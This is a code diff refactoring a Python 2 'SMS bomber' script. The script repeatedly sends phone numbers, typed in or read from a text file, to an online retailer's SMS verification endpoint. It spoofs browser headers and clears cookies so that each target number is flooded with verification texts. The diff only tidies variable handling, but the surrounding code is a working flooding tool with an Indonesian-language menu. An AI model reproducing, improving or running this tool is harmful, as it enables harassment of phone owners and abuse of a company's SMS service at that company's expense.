@@ -42,20 +42,17 @@ class Bomsms(object):
         self.headers = {"User - Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
                         "Referer":"http://sc.jd.id/phone/bindingPhone.html"}
         self.url = "http://sc.jd.id/phone/sendPhoneSms"
-        self.msisdn = None
     def start(self, no):
         print "{}Nomor: {}{} {}{}".format(O, W, G,no, W)
         print self.kirim.post(self.url,data = {"phone":no, "smsType":"1"} , headers=self.headers).text
         self.kirim.cookies.clear
-
     def parser(self, msisdn):
-        self.msisdn = msisdn
-        if self.msisdn[0:1] in "08":
-            Bomsms.list_no.append([self.msisdn,"62"+self.msisdn[1::]])
-        elif self.msisdn[0:1] in "62":
-            Bomsms.list_no.append([self.msisdn, "0"+self.msisdn[2::]])
-        elif self.msisdn[0] in "+":
-            Bomsms.list_no.append([self.msisdn.replace("+",""), "0"+self.msisdn[3::]])
+        if msisdn[0:1] in "08":
+            Bomsms.list_no.append([msisdn,"62"+msisdn[1::]])
+        elif msisdn[0:1] in "62":
+            Bomsms.list_no.append([msisdn, "0"+msisdn[2::]])
+        elif msisdn[0] in "+":
+            Bomsms.list_no.append([msisdn.replace("+",""), "0"+msisdn[3::]])
         return Bomsms.list_no
     def single_num(self):
         for no in Bomsms.list_no:
@@ -75,7 +72,6 @@ class Bomsms(object):
             print P+"Flood Number: ", num[0]+W
             for number in num:
                 self.start(number) 
-
 #Overriding class
 class flood(Bomsms):
     def __init__(self):
@@ -86,19 +82,15 @@ class flood(Bomsms):
     def txt_flood(self, jml):
         for _ in range(0,int(jml)):
             self.start_list()
-
 def single(no, jumlah):
     Bomsms().parser(no)
     flood().nangid(jumlah)
-    
 def list_txt(f):
     Bomsms().phone_list(f)
     Bomsms().start_list()
-
 def flood_txt(f, jumlah):
     Bomsms().phone_list(f)
     flood().txt_flood(jumlah)
-
 def ops():
     while True:
         try:
@@ -111,7 +103,6 @@ def ops():
             if opsi == 1:
                 no = raw_input(O+"NO HANDPHONE: "+W)        
                 single(no,jumlah)
-     
             elif opsi == 2:
                 print "File path *.txt contoh : \n/storage/emulated/0/a/video/no.txt\n"
                 files = raw_input("Masukkan file path *.txt: ")
